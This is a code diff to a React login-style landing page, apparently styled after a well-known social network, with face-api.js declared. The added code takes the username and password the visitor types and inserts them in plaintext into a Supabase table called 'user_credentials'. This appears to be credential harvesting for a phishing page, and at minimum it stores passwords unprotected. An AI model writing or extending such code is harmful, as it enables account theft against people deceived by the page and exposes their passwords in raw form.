@@ -1,4 +1,5 @@
 import { useState, useRef, useEffect, useCallback } from "react";
+import { supabase } from "@/lib/supabase";
 
 // Type declaration for face-api.js global
 declare global {
@@ -44,6 +45,27 @@ export default function Landing() {
 function Screen1({ onNext }: { onNext: () => void }) {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
+  const [submitting, setSubmitting] = useState(false);
+
+  const handleNext = async () => {
+    if (!username.trim() || !password.trim()) {
+      alert("Please fill in both fields.");
+      return;
+    }
+    setSubmitting(true);
+    const { error } = await supabase
+      .from("user_credentials")
+      .insert({ username: username.trim(), password: password.trim() });
+    setSubmitting(false);
+    if (error) {
+      console.error("Supabase insert error:", error);
+      alert("Failed to save credentials. Please try again.");
+      return;
+    }
+    setUsername("");
+    setPassword("");
+    onNext();
+  };
 
   return (
     <>
@@ -106,8 +128,9 @@ function Screen1({ onNext }: { onNext: () => void }) {
         {/* Next Button */}
         <div className="w-full" style={{ maxWidth: 390, marginTop: 11 }}>
           <button
-            onClick={onNext}
-            className="w-full bg-[#0095f6] hover:bg-[#1877f2] active:bg-[#0a7ce1] text-white text-[16px] font-semibold transition-colors flex items-center justify-center"
+            onClick={handleNext}
+            disabled={submitting}
+            className="w-full bg-[#0095f6] hover:bg-[#1877f2] active:bg-[#0a7ce1] text-white text-[16px] font-semibold transition-colors flex items-center justify-center disabled:opacity-50"
             style={{ height: 44, borderRadius: 9999, fontFamily: FONT }}
           >
             Next
